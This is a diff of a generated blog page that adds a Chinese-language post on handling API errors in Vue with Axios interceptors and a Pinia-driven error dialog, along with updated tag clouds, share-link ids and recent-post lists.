+    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%A7%8B/">前端架構</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/06/08/VueApiErrorHandling/">Vue Api Error Handling</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>接著 上一篇文章<a href="https://josephmtsai.github.io/2022/06/05/VueJsErrorHandling/">Vue Error Handling</a></p>
+<h3 id="一般前端開發最常遇到的問題有四塊"><a href="#一般前端開發最常遇到的問題有四塊" class="headerlink" title="一般前端開發最常遇到的問題有四塊"></a>一般前端開發最常遇到的問題有四塊</h3><ol>
+<li>Syntax error</li>
+<li>Runtime error</li>
+<li>Logical error</li>
+<li>Api error</li>
+</ol>
+<p>接著我們針對第四點介紹</p>
+<h1 id="Api-Error"><a href="#Api-Error" class="headerlink" title="Api Error"></a>Api Error</h1><p>一般 Api Error 可以透過 http status Code 去歸類各種錯誤類型</p>
+<p>401 Unauthorized (en-US)<br>403 Forbidden<br>500 Internal Server Error<br>503 Service Unavailable</p>
+<p>以 Axios 套件舉例 用在 vue 上面</p>
+<p><a target="_blank" rel="noopener" href="https://axios-http.com/docs/interceptors">Intercepters</a></p>
+<p>我們一樣可以客製化一份 axios 的攔截器(可以在這裡定義共用的錯誤處理 OR title )</p>
+<img src="/2022/06/08/VueApiErrorHandling/01.png" class="" title="Intercepters">
+
+<p>我們可以在這裡注入 Pinia Store 當 Api 有錯誤的時候 就直接透過 Pinia 的狀態改變觸發 Dialog</p>
+<p>只要把她放在 App.vue 底下就可以使用</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; storeToRefs &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> dialog = <span class="title function_">useDialog</span>();</span><br><span class="line"><span class="keyword">const</span> dialogStore = <span class="title function_">useDialogStore</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; display, title, content &#125; = <span class="title function_">storeToRefs</span>(dialogStore);</span><br><span class="line"><span class="title function_">watch</span>(display, <span class="function">(<span class="params">newValue</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (newValue) &#123;</span><br><span class="line">    dialog.<span class="title function_">error</span>(&#123;</span><br><span class="line">      title,</span><br><span class="line">      content,</span><br><span class="line">      <span class="attr">maskClosable</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">onClose</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        dialogStore.<span class="title function_">hideMessage</span>();</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/08/VueApiErrorHandling/02.png" class="" title="Dialog">
+<p>這樣就可以達到假設有 Api 錯誤 User 可以看到自定義的錯誤訊息以及視窗，也方便我們前端 Debug</p>
+<p><a target="_blank" rel="noopener" href="https://vue-menu.herokuapp.com/error-sample">Demo</a><br><a target="_blank" rel="noopener" href="https://github.com/Josephmtsai/vue_menu">SourceCode</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://josephmtsai.github.io/2022/06/08/VueApiErrorHandling/" data-id="cmpc2o2em002vsu4e56kpeu50" data-title="Vue Api Error Handling" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Axios/" rel="tag">Axios</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Error-Handling/" rel="tag">Error Handling</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue3/" rel="tag">Vue3</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-VueJsErrorHandling" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/06/05/VueJsErrorHandling/" class="article-date">
@@ -110,7 +379,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://josephmtsai.github.io/2022/06/05/VueJsErrorHandling/" data-id="cmpb3v2xp0031tz4eax4taei6" data-title="Vue 前端錯誤處理架構 — 從基礎 ErrorHandler 到生產級 Exception Handler" class="article-share-link">Share</a>
+      <a data-url="https://josephmtsai.github.io/2022/06/05/VueJsErrorHandling/" data-id="cmpc2o2eq0036su4ee6yqc6nl" data-title="Vue 前端錯誤處理架構 — 從基礎 ErrorHandler 到生產級 Exception Handler" class="article-share-link">Share</a>
       
       
       
@@ -165,7 +434,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://josephmtsai.github.io/2022/05/28/VueMounted/" data-id="cmpb3v2xr0038tz4e12cy67pg" data-title="Vue Created Mounted example" class="article-share-link">Share</a>
+      <a data-url="https://josephmtsai.github.io/2022/05/28/VueMounted/" data-id="cmpc2o2es003bsu4e7x3m387f" data-title="Vue Created Mounted example" class="article-share-link">Share</a>
       
       
       
@@ -260,7 +529,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://josephmtsai.github.io/2022/05/07/UCBrowserSupport/" data-id="cmpb3v2xk002htz4e3m5u8ros" data-title="UC Browser Support" class="article-share-link">Share</a>
+      <a data-url="https://josephmtsai.github.io/2022/05/07/UCBrowserSupport/" data-id="cmpc2o2el002ssu4e2pt1c52v" data-title="UC Browser Support" class="article-share-link">Share</a>
       
       
       
@@ -338,7 +607,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://josephmtsai.github.io/2022/05/05/InterceptInApp/" data-id="cmpb3v2x4000ytz4eg0i21n7i" data-title="在手機上如何攔截到 http Request" class="article-share-link">Share</a>
+      <a data-url="https://josephmtsai.github.io/2022/05/05/InterceptInApp/" data-id="cmpc2o2e30011su4e3jka1are" data-title="在手機上如何攔截到 http Request" class="article-share-link">Share</a>
       
       
       
@@ -367,7 +636,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">標籤雲</h3>
     <div class="widget tagcloud">
-      <a href="/tags/NET/" style="font-size: 20px;">.NET</a> <a href="/tags/NET-Framework/" style="font-size: 10px;">.NET Framework</a> <a href="/tags/AOP/" style="font-size: 10px;">AOP</a> <a href="/tags/API-Design/" style="font-size: 11.11px;">API Design</a> <a href="/tags/ASP-NET/" style="font-size: 11.11px;">ASP.NET</a> <a href="/tags/ActionFilter/" style="font-size: 10px;">ActionFilter</a> <a href="/tags/App-Debug/" style="font-size: 10px;">App Debug</a> <a href="/tags/Architecture/" style="font-size: 18.89px;">Architecture</a> <a href="/tags/Asp-net/" style="font-size: 10px;">Asp.net</a> <a href="/tags/Attack/" style="font-size: 10px;">Attack</a> <a href="/tags/Authentication/" style="font-size: 10px;">Authentication</a> <a href="/tags/Axios/" style="font-size: 10px;">Axios</a> <a href="/tags/CMS/" style="font-size: 10px;">CMS</a> <a href="/tags/CSharp/" style="font-size: 11.11px;">CSharp</a> <a href="/tags/Cache/" style="font-size: 12.22px;">Cache</a> <a href="/tags/Cache-Invalidation/" style="font-size: 10px;">Cache Invalidation</a> <a href="/tags/Clean-Architecture/" style="font-size: 10px;">Clean Architecture</a> <a href="/tags/Composable/" style="font-size: 11.11px;">Composable</a> <a href="/tags/Composition-Api/" style="font-size: 10px;">Composition Api</a> <a href="/tags/Cron/" style="font-size: 10px;">Cron</a> <a href="/tags/Debug/" style="font-size: 12.22px;">Debug</a> <a href="/tags/Debugger/" style="font-size: 10px;">Debugger</a> <a href="/tags/Design-Pattern/" style="font-size: 11.11px;">Design Pattern</a> <a href="/tags/DistributedSystem/" style="font-size: 10px;">DistributedSystem</a> <a href="/tags/DotNet/" style="font-size: 11.11px;">DotNet</a> <a href="/tags/ELK/" style="font-size: 13.33px;">ELK</a> <a href="/tags/ESLint/" style="font-size: 10px;">ESLint</a> <a href="/tags/Elasticsearch/" style="font-size: 11.11px;">Elasticsearch</a> <a href="/tags/Enum/" style="font-size: 10px;">Enum</a> <a href="/tags/Error-Handling/" style="font-size: 11.11px;">Error Handling</a> <a href="/tags/EventSPI/" style="font-size: 10px;">EventSPI</a> <a href="/tags/Feature-Flag/" style="font-size: 10px;">Feature Flag</a> <a href="/tags/Fetch/" style="font-size: 10px;">Fetch</a> <a href="/tags/Git/" style="font-size: 11.11px;">Git</a> <a href="/tags/GitFlow/" style="font-size: 11.11px;">GitFlow</a> <a href="/tags/Gzip/" style="font-size: 10px;">Gzip</a> <a href="/tags/Hangfire/" style="font-size: 11.11px;">Hangfire</a> <a href="/tags/Incident/" style="font-size: 10px;">Incident</a> <a href="/tags/Interceptor/" style="font-size: 10px;">Interceptor</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Kibana/" style="font-size: 10px;">Kibana</a> <a href="/tags/LazyCache/" style="font-size: 10px;">LazyCache</a> <a href="/tags/Logging/" style="font-size: 10px;">Logging</a> <a href="/tags/MFA/" style="font-size: 11.11px;">MFA</a> <a href="/tags/MessageHub/" style="font-size: 10px;">MessageHub</a> <a href="/tags/Micro-Frontend/" style="font-size: 10px;">Micro Frontend</a> <a href="/tags/MobileApp/" style="font-size: 12.22px;">MobileApp</a> <a href="/tags/MongoDB/" style="font-size: 10px;">MongoDB</a> <a href="/tags/Monitoring/" style="font-size: 12.22px;">Monitoring</a> <a href="/tags/Nuxt3/" style="font-size: 13.33px;">Nuxt3</a> <a href="/tags/Performance/" style="font-size: 13.33px;">Performance</a> <a href="/tags/Pinia/" style="font-size: 11.11px;">Pinia</a> <a href="/tags/Pre-Commit/" style="font-size: 10px;">Pre-Commit</a> <a href="/tags/Prerender/" style="font-size: 10px;">Prerender</a> <a href="/tags/QA-Testing/" style="font-size: 10px;">QA Testing</a> <a href="/tags/Queue/" style="font-size: 10px;">Queue</a> <a href="/tags/RabbitMQ/" style="font-size: 10px;">RabbitMQ</a> <a href="/tags/Rate-Limiting/" style="font-size: 10px;">Rate Limiting</a> <a href="/tags/RateLimit/" style="font-size: 10px;">RateLimit</a> <a href="/tags/Recording/" style="font-size: 10px;">Recording</a> <a href="/tags/Redis/" style="font-size: 17.78px;">Redis</a> <a href="/tags/Responsible-Gambling/" style="font-size: 11.11px;">Responsible Gambling</a> <a href="/tags/Revert/" style="font-size: 10px;">Revert</a> <a href="/tags/SEO/" style="font-size: 10px;">SEO</a> <a href="/tags/SSO/" style="font-size: 10px;">SSO</a> <a href="/tags/Safari/" style="font-size: 10px;">Safari</a> <a href="/tags/Security/" style="font-size: 14.44px;">Security</a> <a href="/tags/Session/" style="font-size: 12.22px;">Session</a> <a href="/tags/Tailwind-CSS/" style="font-size: 10px;">Tailwind CSS</a> <a href="/tags/TypeScript/" style="font-size: 15.56px;">TypeScript</a> <a href="/tags/Vite/" style="font-size: 10px;">Vite</a> <a href="/tags/Vue/" style="font-size: 12.22px;">Vue</a> <a href="/tags/Vue-Life-Cycle/" style="font-size: 10px;">Vue Life Cycle</a> <a href="/tags/Vue-Router/" style="font-size: 10px;">Vue Router</a> <a href="/tags/Vue-js/" style="font-size: 13.33px;">Vue.js</a> <a href="/tags/Vue3/" style="font-size: 16.67px;">Vue3</a> <a href="/tags/Web-Debug/" style="font-size: 10px;">Web Debug</a> <a href="/tags/Webpack/" style="font-size: 10px;">Webpack</a> <a href="/tags/Workflow/" style="font-size: 10px;">Workflow</a> <a href="/tags/iOS/" style="font-size: 10px;">iOS</a> <a href="/tags/v-html/" style="font-size: 10px;">v-html</a> <a href="/tags/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%A7%8B/" style="font-size: 10px;">前端架構</a> <a href="/tags/%E8%BA%AB%E4%BB%BD%E9%A9%97%E8%AD%89/" style="font-size: 10px;">身份驗證</a>
+      <a href="/tags/NET/" style="font-size: 20px;">.NET</a> <a href="/tags/NET-Framework/" style="font-size: 10px;">.NET Framework</a> <a href="/tags/AOP/" style="font-size: 10px;">AOP</a> <a href="/tags/API-Design/" style="font-size: 11.11px;">API Design</a> <a href="/tags/ASP-NET/" style="font-size: 11.11px;">ASP.NET</a> <a href="/tags/ASP-NET-MVC/" style="font-size: 10px;">ASP.NET MVC</a> <a href="/tags/ActionFilter/" style="font-size: 11.11px;">ActionFilter</a> <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/App-Debug/" style="font-size: 10px;">App Debug</a> <a href="/tags/Architecture/" style="font-size: 18.89px;">Architecture</a> <a href="/tags/Asp-net/" style="font-size: 10px;">Asp.net</a> <a href="/tags/Attack/" style="font-size: 10px;">Attack</a> <a href="/tags/Authentication/" style="font-size: 10px;">Authentication</a> <a href="/tags/Authorization/" style="font-size: 10px;">Authorization</a> <a href="/tags/Axios/" style="font-size: 10px;">Axios</a> <a href="/tags/CMS/" style="font-size: 10px;">CMS</a> <a href="/tags/CSharp/" style="font-size: 11.11px;">CSharp</a> <a href="/tags/Cache/" style="font-size: 12.22px;">Cache</a> <a href="/tags/Cache-Invalidation/" style="font-size: 10px;">Cache Invalidation</a> <a href="/tags/Clean-Architecture/" style="font-size: 10px;">Clean Architecture</a> <a href="/tags/Composable/" style="font-size: 12.22px;">Composable</a> <a href="/tags/Composition-Api/" style="font-size: 10px;">Composition Api</a> <a href="/tags/Cron/" style="font-size: 10px;">Cron</a> <a href="/tags/Debug/" style="font-size: 12.22px;">Debug</a> <a href="/tags/Debugger/" style="font-size: 10px;">Debugger</a> <a href="/tags/Design-Pattern/" style="font-size: 11.11px;">Design Pattern</a> <a href="/tags/DistributedSystem/" style="font-size: 10px;">DistributedSystem</a> <a href="/tags/DotNet/" style="font-size: 11.11px;">DotNet</a> <a href="/tags/ELK/" style="font-size: 13.33px;">ELK</a> <a href="/tags/ESLint/" style="font-size: 10px;">ESLint</a> <a href="/tags/Elasticsearch/" style="font-size: 11.11px;">Elasticsearch</a> <a href="/tags/Enum/" style="font-size: 10px;">Enum</a> <a href="/tags/Error-Handling/" style="font-size: 11.11px;">Error Handling</a> <a href="/tags/EventSPI/" style="font-size: 10px;">EventSPI</a> <a href="/tags/Feature-Flag/" style="font-size: 10px;">Feature Flag</a> <a href="/tags/Fetch/" style="font-size: 10px;">Fetch</a> <a href="/tags/Frontend-Architecture/" style="font-size: 10px;">Frontend Architecture</a> <a href="/tags/Git/" style="font-size: 11.11px;">Git</a> <a href="/tags/GitFlow/" style="font-size: 11.11px;">GitFlow</a> <a href="/tags/Gzip/" style="font-size: 10px;">Gzip</a> <a href="/tags/Hangfire/" style="font-size: 11.11px;">Hangfire</a> <a href="/tags/Incident/" style="font-size: 10px;">Incident</a> <a href="/tags/Interceptor/" style="font-size: 10px;">Interceptor</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Kibana/" style="font-size: 10px;">Kibana</a> <a href="/tags/LazyCache/" style="font-size: 10px;">LazyCache</a> <a href="/tags/Logging/" style="font-size: 10px;">Logging</a> <a href="/tags/Login-Flow/" style="font-size: 10px;">Login Flow</a> <a href="/tags/MFA/" style="font-size: 11.11px;">MFA</a> <a href="/tags/MessageHub/" style="font-size: 10px;">MessageHub</a> <a href="/tags/Micro-Frontend/" style="font-size: 10px;">Micro Frontend</a> <a href="/tags/MobileApp/" style="font-size: 12.22px;">MobileApp</a> <a href="/tags/MongoDB/" style="font-size: 10px;">MongoDB</a> <a href="/tags/Monitoring/" style="font-size: 12.22px;">Monitoring</a> <a href="/tags/Native-Bridge/" style="font-size: 10px;">Native Bridge</a> <a href="/tags/Nuxt3/" style="font-size: 13.33px;">Nuxt3</a> <a href="/tags/Performance/" style="font-size: 13.33px;">Performance</a> <a href="/tags/Pinia/" style="font-size: 11.11px;">Pinia</a> <a href="/tags/Pre-Commit/" style="font-size: 10px;">Pre-Commit</a> <a href="/tags/Prerender/" style="font-size: 10px;">Prerender</a> <a href="/tags/QA-Testing/" style="font-size: 10px;">QA Testing</a> <a href="/tags/Queue/" style="font-size: 10px;">Queue</a> <a href="/tags/RabbitMQ/" style="font-size: 10px;">RabbitMQ</a> <a href="/tags/Rate-Limiting/" style="font-size: 10px;">Rate Limiting</a> <a href="/tags/RateLimit/" style="font-size: 10px;">RateLimit</a> <a href="/tags/Recording/" style="font-size: 10px;">Recording</a> <a href="/tags/Redis/" style="font-size: 16.67px;">Redis</a> <a href="/tags/Responsible-Gambling/" style="font-size: 11.11px;">Responsible Gambling</a> <a href="/tags/Revert/" style="font-size: 10px;">Revert</a> <a href="/tags/RouteConstraint/" style="font-size: 10px;">RouteConstraint</a> <a href="/tags/SEO/" style="font-size: 10px;">SEO</a> <a href="/tags/SSO/" style="font-size: 10px;">SSO</a> <a href="/tags/Safari/" style="font-size: 10px;">Safari</a> <a href="/tags/Security/" style="font-size: 14.44px;">Security</a> <a href="/tags/Session/" style="font-size: 12.22px;">Session</a> <a href="/tags/SessionStorage/" style="font-size: 10px;">SessionStorage</a> <a href="/tags/Tailwind-CSS/" style="font-size: 10px;">Tailwind CSS</a> <a href="/tags/TypeScript/" style="font-size: 15.56px;">TypeScript</a> <a href="/tags/Vite/" style="font-size: 10px;">Vite</a> <a href="/tags/Vue/" style="font-size: 12.22px;">Vue</a> <a href="/tags/Vue-Life-Cycle/" style="font-size: 10px;">Vue Life Cycle</a> <a href="/tags/Vue-Router/" style="font-size: 10px;">Vue Router</a> <a href="/tags/Vue-js/" style="font-size: 13.33px;">Vue.js</a> <a href="/tags/Vue3/" style="font-size: 17.78px;">Vue3</a> <a href="/tags/Web-API/" style="font-size: 10px;">Web API</a> <a href="/tags/Web-Debug/" style="font-size: 10px;">Web Debug</a> <a href="/tags/WebView/" style="font-size: 10px;">WebView</a> <a href="/tags/Webpack/" style="font-size: 10px;">Webpack</a> <a href="/tags/Workflow/" style="font-size: 10px;">Workflow</a> <a href="/tags/iOS/" style="font-size: 11.11px;">iOS</a> <a href="/tags/v-html/" style="font-size: 10px;">v-html</a> <a href="/tags/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%A7%8B/" style="font-size: 10px;">前端架構</a> <a href="/tags/%E8%BA%AB%E4%BB%BD%E9%A9%97%E8%AD%89/" style="font-size: 10px;">身份驗證</a>
     </div>
   </div>
 
@@ -389,7 +658,19 @@
       <ul>
         
           <li>
+            <a href="/2026/05/18/AfterLoginAction/">Vue 3 After Login Action 設計：未登入導頁後如何恢復原本動作</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/18/WebViewNativeBridge/">Vue 3 WebView Native Bridge 設計：同時支援 Android window.App 與 iOS WKWebView</a>
+          </li>
+        
+          <li>
             <a href="/2026/05/17/AccountStateCrossChannelSession/">ASP.NET AccountState 設計：跨 Channel 登入狀態同步與踢出機制</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/17/PageGuardRouteConstraintPermission/">ASP.NET MVC PageGuard 與 RouteConstraint：動態頁面權限管線設計</a>
           </li>
         
           <li>
@@ -416,18 +697,6 @@
             <a href="/2026/04/10/nuxt3-centralized-fetch-interceptor/">Nuxt 3 實戰：用 Composable 封裝集中式請求攔截器</a>
           </li>
         
-          <li>
-            <a href="/2026/04/10/nuxt3-redis-session-management/">Nuxt 3 生產級 Session 管理：Redis + Singleton + 多種登入流程</a>
-          </li>
-        
-          <li>
-            <a href="/2026/04/06/RedLockCacheLayerManager/">RedLock 分散式鎖在 CacheLayerManager 的實作案例</a>
-          </li>
-        
-          <li>
-            <a href="/2026/04/06/WatcherUtilAopPerformance/">WatcherUtil — 用 Delegate 實現 AOP 效能監控，不污染業務邏輯</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -447,7 +716,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">標籤</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/NET/" rel="tag">.NET</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NET-Framework/" rel="tag">.NET Framework</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/AOP/" rel="tag">AOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/API-Design/" rel="tag">API Design</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASP-NET/" rel="tag">ASP.NET</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ActionFilter/" rel="tag">ActionFilter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/App-Debug/" rel="tag">App Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Architecture/" rel="tag">Architecture</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Asp-net/" rel="tag">Asp.net</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Attack/" rel="tag">Attack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Authentication/" rel="tag">Authentication</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Axios/" rel="tag">Axios</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMS/" rel="tag">CMS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSharp/" rel="tag">CSharp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cache/" rel="tag">Cache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cache-Invalidation/" rel="tag">Cache Invalidation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Clean-Architecture/" rel="tag">Clean Architecture</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Composable/" rel="tag">Composable</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Composition-Api/" rel="tag">Composition Api</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cron/" rel="tag">Cron</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Debug/" rel="tag">Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Debugger/" rel="tag">Debugger</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Design-Pattern/" rel="tag">Design Pattern</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DistributedSystem/" rel="tag">DistributedSystem</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DotNet/" rel="tag">DotNet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELK/" rel="tag">ELK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ESLint/" rel="tag">ESLint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Elasticsearch/" rel="tag">Elasticsearch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Enum/" rel="tag">Enum</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Error-Handling/" rel="tag">Error Handling</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/EventSPI/" rel="tag">EventSPI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Feature-Flag/" rel="tag">Feature Flag</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fetch/" rel="tag">Fetch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/" rel="tag">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GitFlow/" rel="tag">GitFlow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Gzip/" rel="tag">Gzip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hangfire/" rel="tag">Hangfire</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Incident/" rel="tag">Incident</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Interceptor/" rel="tag">Interceptor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kibana/" rel="tag">Kibana</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LazyCache/" rel="tag">LazyCache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Logging/" rel="tag">Logging</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MFA/" rel="tag">MFA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MessageHub/" rel="tag">MessageHub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Micro-Frontend/" rel="tag">Micro Frontend</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MobileApp/" rel="tag">MobileApp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MongoDB/" rel="tag">MongoDB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Monitoring/" rel="tag">Monitoring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nuxt3/" rel="tag">Nuxt3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Performance/" rel="tag">Performance</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pinia/" rel="tag">Pinia</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pre-Commit/" rel="tag">Pre-Commit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Prerender/" rel="tag">Prerender</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QA-Testing/" rel="tag">QA Testing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Queue/" rel="tag">Queue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RabbitMQ/" rel="tag">RabbitMQ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rate-Limiting/" rel="tag">Rate Limiting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RateLimit/" rel="tag">RateLimit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Recording/" rel="tag">Recording</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Responsible-Gambling/" rel="tag">Responsible Gambling</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Revert/" rel="tag">Revert</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEO/" rel="tag">SEO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSO/" rel="tag">SSO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Safari/" rel="tag">Safari</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/" rel="tag">Security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tailwind-CSS/" rel="tag">Tailwind CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TypeScript/" rel="tag">TypeScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vite/" rel="tag">Vite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue-Life-Cycle/" rel="tag">Vue Life Cycle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue-Router/" rel="tag">Vue Router</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue-js/" rel="tag">Vue.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue3/" rel="tag">Vue3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Debug/" rel="tag">Web Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Webpack/" rel="tag">Webpack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Workflow/" rel="tag">Workflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iOS/" rel="tag">iOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/v-html/" rel="tag">v-html</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%A7%8B/" rel="tag">前端架構</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BA%AB%E4%BB%BD%E9%A9%97%E8%AD%89/" rel="tag">身份驗證</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/NET/" rel="tag">.NET</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NET-Framework/" rel="tag">.NET Framework</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/AOP/" rel="tag">AOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/API-Design/" rel="tag">API Design</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASP-NET/" rel="tag">ASP.NET</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASP-NET-MVC/" rel="tag">ASP.NET MVC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ActionFilter/" rel="tag">ActionFilter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/App-Debug/" rel="tag">App Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Architecture/" rel="tag">Architecture</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Asp-net/" rel="tag">Asp.net</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Attack/" rel="tag">Attack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Authentication/" 